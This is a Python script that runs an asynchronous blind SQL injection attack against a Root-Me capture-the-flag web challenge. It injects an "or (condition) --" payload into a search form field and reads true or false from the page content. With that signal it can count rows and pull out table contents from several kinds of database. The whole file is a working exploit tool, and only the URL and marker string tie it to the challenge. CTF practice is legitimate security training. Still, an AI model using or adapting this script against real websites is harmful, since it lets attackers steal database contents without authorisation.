#!/usr/bin/env python

from sqli_blinder_async import SQLiBlinder
import argparse
import urllib3
import aiohttp
import asyncio
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


async def request_func(sql):
	"""this function must return True for sql=`1=1` and False for sql=`1=0`"""
	async with aiohttp.ClientSession() as sess:
		url = "http://challenge01.root-me.org:80/web-serveur/ch19/?action=recherche"
		headers = {"User-Agent": "fefefe", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://challenge01.root-me.org", "Connection": "close", "Referer": "http://challenge01.root-me.org/web-serveur/ch19/?action=recherche", "Upgrade-Insecure-Requests": "1"}
		data = {"recherche": "f' or (%s) -- " % sql}
		proxy = 'http://127.0.0.1:8080'# for burp
		proxy = None
		resp = await sess.post(url,data=data,headers=headers,proxy=proxy,ssl=False)
		if resp.status != 200:
			raise Exception('code: %d, ошибка sql: %s'%(resp.status,sql))

		result = await resp.text()
		
		if 'Unable to prepare statement' in result:
			raise Exception('code: %d, ошибка sql: %s'%(resp.status,sql))
		if 'News system' in result:
			return True
		else:
			return False
		

def required(arg,mode):
	print ('argument %s is required for mode %s' % (arg,mode))
	exit(-1)

async def run(args):
	if args.mode == 'check':
		if args.dbms is None:
			args.dbms = 'sqlite'
		sqlib = SQLiBlinder(request_func,args.dbms,multithreaded=multithreaded,threads=args.threads)
		check = await sqlib.check()
		print (check)
		exit(0)

	if args.dbms is None:
		required('dbms',args.mode)
	if args.table is None:
		required('table',args.mode)

	sqlib = SQLiBlinder(request_func,args.dbms,multithreaded=multithreaded,threads=args.threads)
	
	if args.mode == 'count':
		print (await sqlib.get_count(args.table,args.where))
		exit(0)
	elif args.mode == 'one':
		if args.index is None:
			required('index',args.mode)
		if args.column is None:
			required('column',args.mode)
		print (await sqlib.get_string(args.table,args.column,args.index,args.where,args.order_by,verbose=not args.silent))
		exit(0)
	elif args.mode == 'get':
		if args.column is None:
			required('column',args.mode)
		print (await sqlib.get(args.column.split(','),args.table,args.where,
					args.order_by,verbose=not args.silent))
		exit(0)

if __name__=='__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("mode",help="mode - one of ['check','count','one','get']",choices= ['check','count','one','get'])
	parser.add_argument("-t","--table",
						help = "table nmae");
	parser.add_argument("-c","--column",
						help="column names. For get mode could by comma separated array of columns")
	parser.add_argument("-w", "--where", 
						help="where clause")
	parser.add_argument('-i','--index',help='index of row')
	parser.add_argument("--threads",help="number of threads",type=int,default=16)
	parser.add_argument('--dbms',help="DBMS",choices= ['mysql','mssql','sqlite','oracle','postgre'])
	parser.add_argument("--order-by",help="order by column name or index")
	parser.add_argument("-s", "--silent",help="not print output during retrieving",default=False, action='store_true')

	args = parser.parse_args()
	if args.threads <=0 :
		print ('threads > 0')
		exit(-1)
	if args.threads == 1:
		multithreaded = False
	else:
		multithreaded = True

	asyncio.run(run(args))
